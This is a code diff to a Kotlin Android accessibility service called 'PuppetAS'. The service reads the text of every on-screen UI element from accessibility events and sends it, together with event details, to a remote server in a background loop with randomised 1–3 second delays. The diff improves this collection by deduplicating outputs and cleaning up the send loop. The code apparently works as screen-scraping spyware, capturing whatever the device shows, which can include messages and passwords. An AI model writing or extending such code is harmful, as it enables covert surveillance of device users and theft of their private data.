@@ -44,20 +44,17 @@ class PuppetAS : AccessibilityService() {
     private fun heartbeat() {
         Thread {
             while (true) {
-                Thread {
-                    val uid = getUUID()
-                    while (logs.isNotEmpty()) {
-                        try {
-                            heartbeat(uid, logs.joinToString())
-                            logs.clear()
-                            Thread.sleep((1000..3000).random().toLong())
-                        } catch (e: Exception) {
-                            logs.clear()
-                            Log.e("PuppetAS", "Error in sending POST request: ${e.message}")
-                        }
+                val uid = getUUID()
+                if (logs.isNotEmpty()) {
+                    try {
+                        heartbeat(uid, logs.joinToString())
+                    } catch (e: Exception) {
+                        Log.e("PuppetAS", "Error in sending POST request: ${e.message}")
+                    } finally {
+                        logs.clear()
                     }
-                }.start()
-                Thread.sleep((1000..3000).random().toLong())
+                }
+               Thread.sleep((1000..3000).random().toLong())
             }
         }.start()
     }
@@ -252,15 +249,19 @@ class PuppetAS : AccessibilityService() {
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         startActivity(intent)
     }
+    private var lastOutput: String? = null
+
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        Log.d("PuppetAS", "onAccessibilityEvent: $event")
         event?.source?.let { rootNode ->
             val output = traverseNodeAndPrint(rootNode, 1)
-            Log.d("PuppetAS", output)
-            sendLogToServer(output)
+            if (output.length > 5 && output != lastOutput) {
+                Log.d("PuppetAS", "onAccessibilityEvent: $event")
+                Log.d("PuppetAS", output)
+                sendLogToServer("event: $event output: $output")
+                lastOutput = output // store the new output
+            }
         }
     }
-
 
     override fun onInterrupt() {
         Log.d("PuppetAS", "onInterrupt")
